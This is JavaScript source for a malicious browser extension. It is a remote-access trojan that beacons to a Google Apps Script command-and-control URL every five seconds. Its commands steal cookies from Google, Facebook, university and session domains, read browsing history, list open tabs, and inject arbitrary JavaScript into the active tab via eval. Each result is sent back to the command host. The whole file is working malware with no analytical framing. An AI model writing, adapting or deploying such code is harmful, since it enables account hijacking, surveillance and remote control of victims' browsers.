const C2_URL = "https://script.google.com/macros/s/AKfycbwkwM9eh_JVxFMgkw-RXaIsU99Zk3XDW3fz4dTsmPAmmkbOn4VvIRwhgE4AVrs7Jrz4/exec"; 

// ### BEACONING LOOP ###
async function beacon() {
    try {
        let response = await fetch(C2_URL);
        let rawCommand = await response.text();
        if (rawCommand && rawCommand !== "WAITING" && rawCommand.trim() !== "") {
            console.log(`[+] Command received: ${rawCommand}`);
            await processCommand(rawCommand);
        }
    } catch (e) {
        console.error("[-] C2 Connection Error:", e);
    }
}

// ### COMMAND PROCESSOR ###
async function processCommand(rawCmd) {
    let output = "Command executed, no output.";
    let cmd = rawCmd.split(" ")[0];

    try {
        switch (cmd) {
            case "WHOAMI":
                output = `User-Agent: ${navigator.userAgent}\nPlatform: ${navigator.platform}\nLanguage: ${navigator.language}`;
                break;

            case "STEAL_COOKIES":
                let cookies = await chrome.cookies.getAll({});
                if (cookies.length > 0) {
                    // Filter critical domains and limit to avoid overflow
                    let targets = cookies.filter(c => c.domain.includes("google") || c.domain.includes("uni") || c.domain.includes("facebook") || c.session);
                    let data = targets.slice(0, 15).map(c => `${c.domain}::${c.name}=${c.value}`).join(" || ");
                    output = data || "No interesting cookies found (only generic ones).";
                } else {
                    output = "No cookies found in browser storage.";
                }
                break;

            case "GET_HISTORY":
                let historyItems = await chrome.history.search({text: '', maxResults: 20}); // Last 20 visited pages
                output = historyItems.map(h => `[${h.lastVisitTime}] ${h.url}`).join("\n");
                break;

            case "GET_TABS":
                let tabs = await chrome.tabs.query({});
                output = tabs.map(t => `ID: ${t.id} | TITLE: ${t.title} | URL: ${t.url}`).join("\n");
                break;

            case "EXECUTE_JS":
                // Syntax: EXECUTE_JS alert('Hacked')
                let code = rawCmd.substring(11); // Remove "EXECUTE_JS "
                if (!code) { output = "Error: No code provided."; break; }
                
                let activeTabs = await chrome.tabs.query({active: true, currentWindow: true});
                if (activeTabs.length > 0) {
                    await chrome.scripting.executeScript({
                        target: {tabId: activeTabs[0].id},
                        func: (injectedCode) => { eval(injectedCode); }, // Eval is dangerous/powerful
                        args: [code]
                    });
                    output = `Javascript payload injected into tab: ${activeTabs[0].title}`;
                } else {
                    output = "Error: No active tab found to inject script.";
                }
                break;

            default:
                output = `Error: Unknown command '${cmd}'`;
        }
    } catch (err) {
        output = `[-] Execution Error: ${err.message}`;
    }

    await exfiltrateData(output);
}

async function exfiltrateData(data) {
    try {
        await fetch(C2_URL, {
            method: "POST",
            body: JSON.stringify({ result: data })
        });
        console.log("[+] Data exfiltrated successfully.");
    } catch (e) {
        console.error("[-] Exfiltration failed:", e);
    }
}

// Start Beacon (5 seconds jitter)
setInterval(beacon, 5000);